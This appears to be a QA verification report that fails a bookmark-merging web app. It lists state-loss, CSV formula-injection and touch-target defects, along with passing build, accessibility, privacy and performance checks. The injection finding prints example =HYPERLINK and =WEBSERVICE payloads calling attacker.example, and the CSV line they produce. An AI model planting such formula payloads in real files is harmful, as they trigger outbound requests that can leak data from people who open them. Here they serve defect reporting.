# Independent verification 3 — FAIL

**Candidate:** `bd801595b4f8589df8d9440c85defb5560358bbb`

**Live URL:** <https://bookmark-merge-map.sociobot.in/>

**Verified:** 2026-08-28 04:35 UTC

**Scope:** clean detached candidate checkout, exact production build, local production preview, and live static PWA. The researched brief supplied in the work order was used because `.factory/brief.json` is not present. No product code was changed.

## Verdict

**FAIL.** The prior deployment-only CSP failure is repaired, the deployed bytes match this candidate, and the normal bookmark merge works. Release acceptance is nevertheless blocked by two independently reproduced medium-severity defects: changing the tracking-grouping setting silently discards all completed review choices, and the review CSV emits unneutralized spreadsheet formulas from bookmark-controlled titles/folders. A low-severity mobile target-size defect also remains.

| Severity | Count | Result |
| --- | ---: | --- |
| Critical | 0 | None found |
| High | 0 | None found |
| Medium | 2 | Review state loss; unsafe spreadsheet-formula cells |
| Low | 1 | Result URL touch targets are only 19px high |

## Defects

### Medium — tracking-grouping changes erase review choices without warning

Reproduction on the live candidate:

1. Import two four-bookmark exports and compare them. The report correctly shows 8 input copies → 6 distinct routes → 6 in export.
2. On the shared guide row, choose the title `Mobile guide` and destination `Saved on phone`; exclude the unrelated `Desktop only` row.
3. Reload. The app correctly recovers the chosen title, folder, and exclusion from IndexedDB.
4. Turn off “Group common tracking variants,” then turn it back on.

Actual result: the report changes to 8 → 7 → 7 and zero exclusions immediately after the first toggle. The unrelated `Desktop only` row becomes included. After toggling back, it remains included and the shared guide silently reverts to title `Desktop guide` and folder `Research / Maps & field`.

The setting handler recalculates every row without reapplying existing decisions, then persists the reset state. This can change the exported result after the user has completed review. Preserve decisions for unchanged canonical row IDs and explicitly resolve only rows whose grouping actually changed, or warn and require confirmation before clearing choices.

### Medium — review CSV permits spreadsheet-formula injection

A bookmark title and folder are user-controlled data. Importing a bookmark titled:

```text
=HYPERLINK("https://attacker.example/collect","Open")
```

inside folder:

```text
=WEBSERVICE("https://attacker.example/folder")
```

and exporting the review CSV produces this record prefix:

```csv
a-only,true,"=HYPERLINK(""https://attacker.example/collect"",""Open"")",https://safe.example,https://safe.example/,"=WEBSERVICE(""https://attacker.example/folder"")"
```

CSV quoting does not neutralize a leading formula marker after a spreadsheet parses the field. A review file opened in formula-capable spreadsheet software can therefore evaluate attacker-controlled content and initiate an outbound request. Neutralize cells beginning with `=`, `+`, `-`, `@`, tab, or carriage return while preserving the value for audit, and add regression tests for title and folder columns.

### Low — result URL links miss the required 44px mobile target height

At the required 390px viewport, each populated result URL is a full-width interactive link but its computed target is only 19px high (examples measured at 298×19, 330×19, and 360×19 CSS px). The attached accessibility/design contract requires 44×44 CSS px targets. Keyboard access and spacing remain usable, and axe does not classify this as serious/critical, so severity is low. Increase the URL link's block padding/min-height without harming row density.

## Clean checkout and repository gates

- Created a separate detached worktree at exactly `bd801595b4f8589df8d9440c85defb5560358bbb`; it began clean and remained free of source changes.
- `npm ci`: passed; 114 packages installed, 115 audited, 0 vulnerabilities.
- `npm run typecheck`: passed.
- No lint script or lint configuration exists; TypeScript is the available static source gate.
- `npm test`: passed, 2 files and 8/8 tests.
- `npm audit --audit-level=low`: passed, 0 vulnerabilities.
- `npm audit --omit=dev --audit-level=low`: passed, 0 vulnerabilities.
- Exact `npm run build`: passed and produced `dist/`.
- Committed Playwright suite: 14/14 passed locally and 14/14 passed live across desktop Chromium and Pixel 5 at 390×844.
- This is a static PWA, not a library, CLI, or backend; consumer-package, server concurrency, health, and server persistence checks do not apply.

## Independent end-to-end exercise

A verifier-owned Playwright harness, separate from the committed tests, exercised the live deployment:

- Imported nested desktop/mobile Netscape exports with host case, default HTTPS port, fragments, reordered query parameters, and `utm_source` variants.
- Correctly reported 8 input copies → 6 distinct routes → 6 included routes, with 2 same-title/different-URL conflicts, 1 A-only, 1 B-only, and 2 shared routes. All six distinct routes were included by default.
- Selected an alternate title and folder, excluded one route, and inspected both downloads. The merged HTML had exactly five anchors, kept the selected title/folder, omitted only the explicit exclusion, preserved an original URL, and remained Netscape-format HTML. The CSV had one header plus six audit rows and recorded the exclusion.
- Reloaded and confirmed the review choices recovered from IndexedDB before exercising the failing settings path above.
- Rejected a `.txt` file, HTML with no bookmarks, and a 20 MiB + 1 byte file with actionable messages; a valid `.htm` import then recovered and completed comparison.
- Exercised the 80/81 rendering boundary (`Show 1 more`), no-match search and recovery, and both cancel/confirm paths for “Start over.”
- Captured requests during private-file processing: every request remained on `bookmark-merge-map.sociobot.in`; no bookmark URL, analytics, third-party font/script, API, or tracking request occurred. No cookies were set.
- Desktop and 390px screenshots were visually inspected. The product-specific topographic hierarchy remained clear, and 200% text at 390px had no horizontal overflow or missing content.

## Accessibility, keyboard, and browser stability

- Axe 4.10.2 found zero serious or critical violations on populated desktop results and the keyboard-modified mobile state at 200% text.
- Lighthouse accessibility scored 100 on both fresh mobile and desktop runs.
- Keyboard-only checks covered the skip link, sample import, result filter, and bulk exclusion with Tab/Enter. The skip link showed a 3px forest outline and 6px ochre outer ring; no trap occurred.
- Reduced-motion emulation reduced transitions to 0.01ms. No horizontal overflow occurred at 390×844 with 200% root text.
- Main shell: descriptive title, `lang="en"`, exactly one H1, main landmark, and no missing image alt text. Privacy, terms, and offline pages each returned 200 with one H1 and one main landmark.
- Console errors and uncaught page errors: zero across the main workflow, invalid-input recovery, mobile flow, `/privacy/`, `/terms/`, controlled offline reload, and `/offline.html`.
- Factory URL verification returned HTTP 200 in 635ms with zero errors and passed title, language, one-H1, main, image-alt, and button-label checks.

## PWA and offline behavior

- Chromium parsed `manifest.webmanifest` with zero errors. It has a versioned `start_url`, standalone display, matching `#F4F0E6` theme/background, 192×192 and 512×512 icons, and a 512×512 maskable icon; the files have the declared dimensions.
- The live worker controlled the page, used `bookmark-merge-map-v5`, and completed `registration.update()`.
- After importing the sample, a controlled offline reload restored all five result rows and announced `Offline · your saved map is available`.
- Direct `/offline.html` also reloaded offline with zero errors and retained the intended paper background, ink color, system font, and 18px text.
- A two-script update was simulated against an ephemeral local server serving the exact candidate `dist/`: after the page was controlled, a comment-only worker revision caused a second `/sw.js` request, the `updatefound` path, and the in-app toast `An updated offline map is ready. It will apply on the next visit.` The candidate worker contains `skipWaiting()` and `clients.claim()`, and the committed two-profile suite separately confirmed its active registration.

## Privacy and response policy

- Local parsing, IndexedDB recovery, merge generation, and downloads made same-origin requests only. No analytics, external fonts/scripts, account, payment, server API, bookmark-page fetch, or cookie was observed.
- `/privacy/` and `/terms/` accurately disclose local IndexedDB/service-worker storage and ordinary access logs.
- HTTP redirects to HTTPS. Live responses include HSTS, `nosniff`, strict-origin referrer policy, same-origin CSP with `frame-ancestors 'none'` and `object-src 'none'`, and a restrictive Permissions Policy.
- Hashed JS/CSS return `public, max-age=31536000, immutable`; the manifest returns `application/manifest+json` with five-minute revalidation; `/sw.js` returns JavaScript with `no-cache`; `/offline.css` returns `text/css`.
- The earlier offline fallback defect is fixed: `/offline.html` uses same-origin `/offline.css`, the strict CSP reports no violation, and the stylesheet is precached.

## Live deployment identity

SHA-256 comparison matched every publicly served file in the clean `dist/` byte for byte: 20/20 applicable artifacts, including root and legal HTML, offline HTML/CSS, manifest, worker, hashed JS/CSS/source map, icons, hero variants, robots, and sitemap. `staticwebapp.config.json` correctly returns 404 because it is deployment configuration rather than a public asset.

Key hashes:

| Artifact | SHA-256 |
| --- | --- |
| `/` | `9e1a065acd588c2daabdec8b779dfb8002bb326616ba13c7283042a87baadbfa` |
| `/assets/main-B_NbxDzm.js` | `75793d84ab9ccf8466d5ebdfa8e6caa9e4c419c819fbf9dfc4ab68313d7a9e63` |
| `/assets/main-Du6LmM5a.css` | `f99596d25cd8a8c9a374521646762eb604f0a0b64cf8b8cf3a824248ec05fcfe` |
| `/offline.html` | `02c69d963c6333253582e79506d3349b6c7945e80840ff572199783f4879e310` |
| `/offline.css` | `8ba9dbfe622754184d66094954666fdb9b49046040f7c7e68f6be7c9e83463ae` |
| `/sw.js` | `c171c4a0c28fb29bd391decba8dced09d4c2eb241d2d5751a419464afb1cef98` |

This establishes that the failures are candidate behavior, not stale deployment content.

## Performance and budgets

Fresh Lighthouse 13.4.1 results against production:

| Profile | Performance | Accessibility | Best practices | SEO | FCP | LCP | TBT | CLS | Transfer |
| --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: |
| Mobile | 99 | 100 | 100 | 100 | 0.9s | 1.2s | 90ms | 0 | 75 KiB |
| Desktop | 100 | 100 | 100 | 100 | 0.2s | 0.4s | 0ms | 0 | 166 KiB |

Local production output remains within the contract: main JavaScript 23.99 KB raw / 8.68 KB gzip, main CSS 16.06 KB raw / 4.48 KB gzip, no downloaded fonts, and the mobile hero is 60,854 bytes. Lab Lighthouse does not report INP without field interaction data; observed interactions and browser tests completed without blocking or layout instability.

## Documentation and design

- README covers purpose, audience, local run/test/build/deploy, privacy, limitations, and license; MIT `LICENSE`, `/privacy/`, `/terms/`, `.factory/design.md`, and image prompt/provenance are present.
- The single-mode topographic reconciliation thesis documents palette, typography, spacing, interaction grammar, motion, originality, and rationale. Visual inspection found it distinct and task-appropriate.

## Commands used

```bash
npm ci
npm run typecheck
npm test
npm audit --audit-level=low
npm audit --omit=dev --audit-level=low
npm run build
npm run test:e2e
PLAYWRIGHT_BASE_URL=https://bookmark-merge-map.sociobot.in npm run test:e2e
VERIFY_NODE_MODULES=<clean-checkout>/node_modules /opt/fleet/lib/verify-url.sh https://bookmark-merge-map.sociobot.in <evidence-dir>
CHROME_PATH=/opt/pw-browsers/chromium-1208/chrome-linux64/chrome npx --yes lighthouse@13.4.1 https://bookmark-merge-map.sociobot.in ...
```
